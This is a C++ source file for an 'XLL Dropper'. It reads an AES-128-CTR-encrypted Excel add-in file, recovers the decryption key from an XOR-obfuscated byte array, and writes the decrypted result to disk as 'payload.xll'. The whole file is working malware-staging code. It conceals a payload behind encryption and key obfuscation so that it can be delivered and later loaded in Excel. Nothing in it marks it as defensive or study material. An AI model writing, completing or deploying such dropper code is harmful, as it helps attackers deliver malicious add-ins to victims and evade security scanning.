#include <iostream>
#include <fstream>
#include <vector>
#include <openssl/evp.h>
#include <openssl/err.h>

constexpr uint8_t XOR_OBFUSCATE_KEY = 0x5A;

// Obfuscated key (same as encryptor). Adjust as needed.
uint8_t encKey[] = { 0x39,0x39,0x08,0x0F,0x0F,0x38,0x08,0x31,0x38,0x32,0x38 };
constexpr size_t keyLen = sizeof(encKey);

inline void decryptKey(uint8_t* keyBuf) {
    for (size_t i = 0; i < keyLen; ++i) {
        keyBuf[i] = encKey[i] ^ XOR_OBFUSCATE_KEY;
    }
}

// Decrypts entire buffer in memory using AES-128 CTR
bool aesCtrCrypt(const std::vector<unsigned char>& inData,
                 std::vector<unsigned char>& outData,
                 const unsigned char* aesKey,
                 const unsigned char* iv) {
    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    if (!ctx) return false;

    bool ok = EVP_EncryptInit_ex(ctx, EVP_aes_128_ctr(), nullptr, aesKey, iv) == 1;
    if (!ok) { EVP_CIPHER_CTX_free(ctx); return false; }

    outData.resize(inData.size() + EVP_MAX_BLOCK_LENGTH);
    int outLen = 0;
    ok = EVP_EncryptUpdate(ctx, outData.data(), &outLen,
                           inData.data(), static_cast<int>(inData.size())) == 1;
    int totalLen = outLen;
    int finalLen = 0;
    if (ok) ok = EVP_EncryptFinal_ex(ctx, outData.data() + outLen, &finalLen) == 1;
    totalLen += finalLen;
    outData.resize(totalLen);

    EVP_CIPHER_CTX_free(ctx);
    return ok;
}

int main(int argc, char* argv[]) {
    std::cout << "XLL Dropper - decrypts and writes XLL file." << std::endl;
    if (argc < 2 || argc > 3) {
        std::cerr << "Usage: xll_dropper <encrypted_xll> [destination_path]" << std::endl;
        return 1;
    }
    const char* inPath = argv[1];
    const char* outPath = (argc == 3) ? argv[2] : "payload.xll";

    // Read encrypted XLL into memory
    std::ifstream fin(inPath, std::ios::binary | std::ios::ate);
    if (!fin) {
        std::cerr << "Failed to open input file." << std::endl;
        return 1;
    }
    std::streamsize size = fin.tellg();
    fin.seekg(0, std::ios::beg);
    std::vector<unsigned char> encBuf(size);
    if (!fin.read(reinterpret_cast<char*>(encBuf.data()), size)) {
        std::cerr << "Failed to read input file." << std::endl;
        return 1;
    }
    fin.close();

    // Prepare AES key (16 bytes) and IV (all zero)
    unsigned char aesKey[16];
    unsigned char iv[16] = {0};
    uint8_t key[keyLen];
    decryptKey(key);
    for (size_t i = 0; i < 16; ++i) aesKey[i] = key[i % keyLen];

    // Decrypt
    std::vector<unsigned char> plainBuf;
    if (!aesCtrCrypt(encBuf, plainBuf, aesKey, iv)) {
        std::cerr << "AES decryption failed." << std::endl;
        return 1;
    }

    // Write to output path
    std::ofstream fout(outPath, std::ios::binary);
    if (!fout) {
        std::cerr << "Failed to open output file for writing." << std::endl;
        return 1;
    }
    fout.write(reinterpret_cast<char*>(plainBuf.data()), plainBuf.size());
    fout.close();

    std::cout << "Dropped XLL to " << outPath << std::endl;
    return 0;
}